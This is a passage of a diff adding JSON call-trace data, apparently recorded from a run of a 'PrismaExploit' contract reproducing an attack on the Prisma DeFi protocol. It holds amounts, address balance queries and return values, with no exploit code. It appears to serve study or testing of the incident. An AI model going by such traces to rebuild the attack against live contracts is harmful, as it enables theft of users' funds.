+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "3736",
+        "args": "2000000000000000000000 [2e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000051f7a1150"
+    },
+    {
+        "id": "3564",
+        "args": "2000000000000000000000 [2e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000051f7a1150"
+    },
+    {
+        "id": "359",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000fdce0267803c6a0d209d3721d2f01fd618e9cbf8"
+    },
+    {
+        "id": "2972",
+        "args": "0xfdCE0267803C6a0D209D3721d2f01Fd618e9CBF8, 22002930000 [2.2e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1430",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000f43fc2c04ee0000"
+    },
+    {
+        "id": "1264",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000f43fc2c04ee0000"
+    },
+    {
+        "id": "477796",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18], 2200000000022002930000 [2.2e21], 45454545454090848 [4.545e16], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000de0b6b3a7640000000000000000000000000000000000000000000000000000000000000000001d"
+    },
+    {
+        "id": "477585",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18], 2200000000022002930000 [2.2e21], 45454545454090848 [4.545e16], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000de0b6b3a7640000000000000000000000000000000000000000000000000000000000000000001d"
+    },
+    {
+        "id": "276765",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 45454545454090848 [4.545e16], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "276578",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 45454545454090848 [4.545e16], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3238",
+        "args": "0x3B15CEc2d922Ab0Ef74688bcC1056461049f89CB",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000002876919d00e0253"
+    },
+    {
+        "id": "3066",
+        "args": "0x3B15CEc2d922Ab0Ef74688bcC1056461049f89CB",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000002876919d00e0253"
+    },
+    {
+        "id": "3238",
+        "args": "0x3B15CEc2d922Ab0Ef74688bcC1056461049f89CB",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000002876919d00e0253"
+    },
+    {
+        "id": "3066",
+        "args": "0x3B15CEc2d922Ab0Ef74688bcC1056461049f89CB",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000002876919d00e0253"
+    },
+    {
+        "id": "3238",
+        "args": "0x4A3Fced7C536e39ca5292A024ee66C9B45b257eC",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001fa3ee604ff7538"
+    },
+    {
+        "id": "3066",
+        "args": "0x4A3Fced7C536e39ca5292A024ee66C9B45b257eC",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001fa3ee604ff7538"
+    },
+    {
+        "id": "3238",
+        "args": "0x4A3Fced7C536e39ca5292A024ee66C9B45b257eC",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001fa3ee604ff7538"
+    },
+    {
+        "id": "3066",
+        "args": "0x4A3Fced7C536e39ca5292A024ee66C9B45b257eC",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001fa3ee604ff7538"
+    },
+    {
+        "id": "3238",
+        "args": "0xcbfDfFD7a2819a47FcD07DfA8bcB8A5DEACc9eA8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001e9c08df5303366"
+    },
+    {
+        "id": "3066",
+        "args": "0xcbfDfFD7a2819a47FcD07DfA8bcB8A5DEACc9eA8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001e9c08df5303366"
+    },
+    {
+        "id": "3238",
+        "args": "0xcbfDfFD7a2819a47FcD07DfA8bcB8A5DEACc9eA8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001e9c08df5303366"
+    },
+    {
+        "id": "3066",
+        "args": "0xcbfDfFD7a2819a47FcD07DfA8bcB8A5DEACc9eA8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001e9c08df5303366"
+    },
+    {
+        "id": "3238",
+        "args": "0x409C6c5Ec5C479673f4c09fb80d0F182Fcff643e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001d5d79c7d9b727d"
+    },
+    {
+        "id": "3066",
+        "args": "0x409C6c5Ec5C479673f4c09fb80d0F182Fcff643e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001d5d79c7d9b727d"
+    },
+    {
+        "id": "3238",
+        "args": "0x409C6c5Ec5C479673f4c09fb80d0F182Fcff643e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001d5d79c7d9b727d"
+    },
+    {
+        "id": "3066",
+        "args": "0x409C6c5Ec5C479673f4c09fb80d0F182Fcff643e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001d5d79c7d9b727d"
+    },
+    {
+        "id": "3238",
+        "args": "0xe0042d684Fe6bFA4D897082f97B41532aA39640c",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c31d1114c8d420"
+    },
+    {
+        "id": "3066",
+        "args": "0xe0042d684Fe6bFA4D897082f97B41532aA39640c",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c31d1114c8d420"
+    },
+    {
+        "id": "3238",
+        "args": "0xe0042d684Fe6bFA4D897082f97B41532aA39640c",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c31d1114c8d420"
+    },
+    {
+        "id": "3066",
+        "args": "0xe0042d684Fe6bFA4D897082f97B41532aA39640c",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c31d1114c8d420"
+    },
+    {
+        "id": "3238",
+        "args": "0xC487370895F6E8f5b62d99bf1472c95a94073379",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c2ddf9328f78c3"
+    },
+    {
+        "id": "3066",
+        "args": "0xC487370895F6E8f5b62d99bf1472c95a94073379",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c2ddf9328f78c3"
+    },
+    {
+        "id": "3238",
+        "args": "0xC487370895F6E8f5b62d99bf1472c95a94073379",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c2ddf9328f78c3"
+    },
+    {
+        "id": "3066",
+        "args": "0xC487370895F6E8f5b62d99bf1472c95a94073379",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c2ddf9328f78c3"
+    },
+    {
+        "id": "3238",
+        "args": "0xf8D1C9AB49219f7acF7b1d84705e5Aea3b8Ce0aa",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c21e0203633bbb"
+    },
+    {
+        "id": "3066",
+        "args": "0xf8D1C9AB49219f7acF7b1d84705e5Aea3b8Ce0aa",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c21e0203633bbb"
+    },
+    {
+        "id": "3238",
+        "args": "0xf8D1C9AB49219f7acF7b1d84705e5Aea3b8Ce0aa",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c21e0203633bbb"
+    },
+    {
+        "id": "3066",
+        "args": "0xf8D1C9AB49219f7acF7b1d84705e5Aea3b8Ce0aa",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c21e0203633bbb"
+    },
+    {
+        "id": "3238",
+        "args": "0x3B82eE6c15B212Ed69D5795bCD957e136EAA4bfF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001aeba3ca1181dc8"
+    },
+    {
+        "id": "3066",
+        "args": "0x3B82eE6c15B212Ed69D5795bCD957e136EAA4bfF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001aeba3ca1181dc8"
+    },
+    {
+        "id": "3238",
+        "args": "0x3B82eE6c15B212Ed69D5795bCD957e136EAA4bfF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001aeba3ca1181dc8"
+    },
+    {
+        "id": "3066",
+        "args": "0x3B82eE6c15B212Ed69D5795bCD957e136EAA4bfF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001aeba3ca1181dc8"
+    },
+    {
+        "id": "3238",
+        "args": "0x1b004189e64d5b2F71d5Be554470E6c49e10123B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000019f23fee6c9447b"
+    },
+    {
+        "id": "3066",
+        "args": "0x1b004189e64d5b2F71d5Be554470E6c49e10123B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000019f23fee6c9447b"
+    },
+    {
+        "id": "3238",
+        "args": "0x1b004189e64d5b2F71d5Be554470E6c49e10123B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000019f23fee6c9447b"
+    },
+    {
+        "id": "3066",
+        "args": "0x1b004189e64d5b2F71d5Be554470E6c49e10123B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000019f23fee6c9447b"
+    },
+    {
+        "id": "3238",
+        "args": "0x16F570e93fDbC3A4865b7740DEB052eE94d87E15",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000190140a18bfbaad"
+    },
+    {
+        "id": "3066",
+        "args": "0x16F570e93fDbC3A4865b7740DEB052eE94d87E15",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000190140a18bfbaad"
+    },
+    {
+        "id": "3238",
+        "args": "0x16F570e93fDbC3A4865b7740DEB052eE94d87E15",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000190140a18bfbaad"
+    },
+    {
+        "id": "3066",
+        "args": "0x16F570e93fDbC3A4865b7740DEB052eE94d87E15",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000190140a18bfbaad"
+    },
+    {
+        "id": "3238",
+        "args": "0x1B72Bac3772050FDCaF468CcE7e20deb3cB02d89",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018fdacb9a67bc5f"
+    },
+    {
+        "id": "3066",
+        "args": "0x1B72Bac3772050FDCaF468CcE7e20deb3cB02d89",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018fdacb9a67bc5f"
+    },
+    {
+        "id": "3238",
+        "args": "0x1B72Bac3772050FDCaF468CcE7e20deb3cB02d89",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018fdacb9a67bc5f"
+    },
+    {
+        "id": "3066",
+        "args": "0x1B72Bac3772050FDCaF468CcE7e20deb3cB02d89",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018fdacb9a67bc5f"
+    },
+    {
+        "id": "3238",
+        "args": "0x9FceDEd3a0c838d1e73E88ddE466f197DF379f70",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018eb066ccf05599"
+    },
+    {
+        "id": "3066",
+        "args": "0x9FceDEd3a0c838d1e73E88ddE466f197DF379f70",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018eb066ccf05599"
+    },
+    {
+        "id": "3238",
+        "args": "0x9FceDEd3a0c838d1e73E88ddE466f197DF379f70",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018eb066ccf05599"
+    },
+    {
+        "id": "3066",
+        "args": "0x9FceDEd3a0c838d1e73E88ddE466f197DF379f70",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018eb066ccf05599"
+    },
+    {
+        "id": "3238",
+        "args": "0x14B30b46ec4fA1a993806bd5Dda4195C5a82353e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018e3e249c18e24b"
+    },
+    {
+        "id": "3066",
+        "args": "0x14B30b46ec4fA1a993806bd5Dda4195C5a82353e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018e3e249c18e24b"
+    },
+    {
+        "id": "3238",
+        "args": "0x14B30b46ec4fA1a993806bd5Dda4195C5a82353e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018e3e249c18e24b"
+    },
+    {
+        "id": "3066",
+        "args": "0x14B30b46ec4fA1a993806bd5Dda4195C5a82353e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018e3e249c18e24b"
+    },
+    {
+        "id": "3238",
+        "args": "0xc47faE56f3702737B69ed615950c01217ec5C7C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001867652df4a6b70"
+    },
+    {
+        "id": "3066",
+        "args": "0xc47faE56f3702737B69ed615950c01217ec5C7C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001867652df4a6b70"
+    },
+    {
+        "id": "3238",
+        "args": "0xc47faE56f3702737B69ed615950c01217ec5C7C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001867652df4a6b70"
+    },
+    {
+        "id": "3066",
+        "args": "0xc47faE56f3702737B69ed615950c01217ec5C7C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001867652df4a6b70"
+    },
+    {
+        "id": "3238",
+        "args": "0x19562DF3E7FD2aE7AF4e6Bd288b04C2C90405212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000185c6646fe9626a"
+    },
+    {
+        "id": "3066",
+        "args": "0x19562DF3E7FD2aE7AF4e6Bd288b04C2C90405212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000185c6646fe9626a"
+    },
+    {
+        "id": "3238",
+        "args": "0x19562DF3E7FD2aE7AF4e6Bd288b04C2C90405212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000185c6646fe9626a"
+    },
+    {
+        "id": "3066",
+        "args": "0x19562DF3E7FD2aE7AF4e6Bd288b04C2C90405212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000185c6646fe9626a"
+    },
+    {
+        "id": "3238",
+        "args": "0xf9Ca66Ef84C773faB422562ab41b1EE8d4397418",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000015cb9fecb1cb333"
+    },
+    {
+        "id": "3066",
+        "args": "0xf9Ca66Ef84C773faB422562ab41b1EE8d4397418",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000015cb9fecb1cb333"
+    },
+    {
+        "id": "3238",
+        "args": "0xf9Ca66Ef84C773faB422562ab41b1EE8d4397418",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000015cb9fecb1cb333"
+    },
+    {
+        "id": "3066",
+        "args": "0xf9Ca66Ef84C773faB422562ab41b1EE8d4397418",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000015cb9fecb1cb333"
+    },
+    {
+        "id": "3238",
+        "args": "0x183D0567c33e7591c22540E45D2F74730b42a0ca",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000013f35db5e3976a5"
+    },
+    {
+        "id": "3066",
+        "args": "0x183D0567c33e7591c22540E45D2F74730b42a0ca",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000013f35db5e3976a5"
+    },
+    {
+        "id": "3238",
+        "args": "0x183D0567c33e7591c22540E45D2F74730b42a0ca",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000013f35db5e3976a5"
+    },
+    {
+        "id": "3066",
+        "args": "0x183D0567c33e7591c22540E45D2F74730b42a0ca",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000013f35db5e3976a5"
+    },
+    {
+        "id": "3238",
+        "args": "0xA22eb3338dFd69458513a1F6D4742AB29F7eF333",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001111ad251191be0"
+    },
+    {
+        "id": "3066",
+        "args": "0xA22eb3338dFd69458513a1F6D4742AB29F7eF333",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001111ad251191be0"
+    },
+    {
+        "id": "3238",
+        "args": "0xA22eb3338dFd69458513a1F6D4742AB29F7eF333",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001111ad251191be0"
+    },
+    {
+        "id": "3066",
+        "args": "0xA22eb3338dFd69458513a1F6D4742AB29F7eF333",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001111ad251191be0"
+    },
+    {
+        "id": "3238",
+        "args": "0x599275bE9753Ecd8E6c380A7Ef78E38711b8F212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010c35b268575e5a"
+    },
+    {
+        "id": "3066",
+        "args": "0x599275bE9753Ecd8E6c380A7Ef78E38711b8F212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010c35b268575e5a"
+    },
+    {
+        "id": "3238",
+        "args": "0x599275bE9753Ecd8E6c380A7Ef78E38711b8F212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010c35b268575e5a"
+    },
+    {
+        "id": "3066",
+        "args": "0x599275bE9753Ecd8E6c380A7Ef78E38711b8F212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010c35b268575e5a"
+    },
+    {
+        "id": "3238",
+        "args": "0xD143Ed1aE715Fb149cb2356Ca18138E29D308E72",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000107a16ce347ff6f"
+    },
+    {
+        "id": "3066",
+        "args": "0xD143Ed1aE715Fb149cb2356Ca18138E29D308E72",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000107a16ce347ff6f"
+    },
+    {
+        "id": "3238",
+        "args": "0xD143Ed1aE715Fb149cb2356Ca18138E29D308E72",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000107a16ce347ff6f"
+    },
+    {
+        "id": "3066",
+        "args": "0xD143Ed1aE715Fb149cb2356Ca18138E29D308E72",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000107a16ce347ff6f"
+    },
+    {
+        "id": "3238",
+        "args": "0x3F3E305C4Ad49271EBDA489dd43d2c8F027d2D41",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010437bf72e0b0a7"
+    },
+    {
+        "id": "3066",
+        "args": "0x3F3E305C4Ad49271EBDA489dd43d2c8F027d2D41",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010437bf72e0b0a7"
+    },
+    {
+        "id": "3238",
+        "args": "0x3F3E305C4Ad49271EBDA489dd43d2c8F027d2D41",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010437bf72e0b0a7"
+    },
+    {
+        "id": "3066",
+        "args": "0x3F3E305C4Ad49271EBDA489dd43d2c8F027d2D41",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010437bf72e0b0a7"
+    },
+    {
+        "id": "3238",
+        "args": "0x1428BD476719AeCD9db6A21396A9E1C3865A9382",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000e8d08313fa8682"
+    },
+    {
+        "id": "3066",
+        "args": "0x1428BD476719AeCD9db6A21396A9E1C3865A9382",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000e8d08313fa8682"
+    },
+    {
+        "id": "3238",
+        "args": "0x1428BD476719AeCD9db6A21396A9E1C3865A9382",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000e8d08313fa8682"
+    },
+    {
+        "id": "3066",
+        "args": "0x1428BD476719AeCD9db6A21396A9E1C3865A9382",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000e8d08313fa8682"
+    },
+    {
+        "id": "3238",
+        "args": "0x308fD47D492cF32D0f504c2a3E82BC25583B455B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dea6968c07ac9d"
+    },
+    {
+        "id": "3066",
+        "args": "0x308fD47D492cF32D0f504c2a3E82BC25583B455B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dea6968c07ac9d"
+    },
+    {
+        "id": "3238",
+        "args": "0x308fD47D492cF32D0f504c2a3E82BC25583B455B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dea6968c07ac9d"
+    },
+    {
+        "id": "3066",
+        "args": "0x308fD47D492cF32D0f504c2a3E82BC25583B455B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dea6968c07ac9d"
+    },
+    {
+        "id": "3238",
+        "args": "0x0c98361F38Ed48A5a287Cc8e4d07f22E5FcbcaCF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dd95213183f3aa"
+    },
+    {
+        "id": "3066",
+        "args": "0x0c98361F38Ed48A5a287Cc8e4d07f22E5FcbcaCF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dd95213183f3aa"
+    },
+    {
+        "id": "3238",
+        "args": "0x0c98361F38Ed48A5a287Cc8e4d07f22E5FcbcaCF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dd95213183f3aa"
+    },
+    {
+        "id": "3066",
+        "args": "0x0c98361F38Ed48A5a287Cc8e4d07f22E5FcbcaCF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dd95213183f3aa"
+    },
+    {
+        "id": "3238",
+        "args": "0x17ad4E76e67E9937A2B2EF882e4042Dd00Cc60F7",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000d522f26afe0298"
+    },
+    {
+        "id": "3066",
+        "args": "0x17ad4E76e67E9937A2B2EF882e4042Dd00Cc60F7",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000d522f26afe0298"
+    },
+    {
+        "id": "3238",
+        "args": "0x17ad4E76e67E9937A2B2EF882e4042Dd00Cc60F7",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000d522f26afe0298"
+    },
+    {
+        "id": "3066",
+        "args": "0x17ad4E76e67E9937A2B2EF882e4042Dd00Cc60F7",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000d522f26afe0298"
+    },
+    {
+        "id": "3238",
+        "args": "0x82af4e3930590bf2b3Eaa386d1875c0b5A3A7ED1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000b18d6268261893"
+    },
+    {
+        "id": "3066",
+        "args": "0x82af4e3930590bf2b3Eaa386d1875c0b5A3A7ED1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000b18d6268261893"
+    },
+    {
+        "id": "3238",
+        "args": "0x82af4e3930590bf2b3Eaa386d1875c0b5A3A7ED1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000b18d6268261893"
+    },
+    {
+        "id": "3066",
+        "args": "0x82af4e3930590bf2b3Eaa386d1875c0b5A3A7ED1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000b18d6268261893"
+    },
+    {
+        "id": "3238",
+        "args": "0x774bB9306DF1cd921eb842b1388c78f75e6Ef79F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000838a25da6dc459"
+    },
+    {
+        "id": "3066",
+        "args": "0x774bB9306DF1cd921eb842b1388c78f75e6Ef79F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000838a25da6dc459"
+    },
+    {
+        "id": "6080",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6, 1000000000000000000 [1e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "8290",
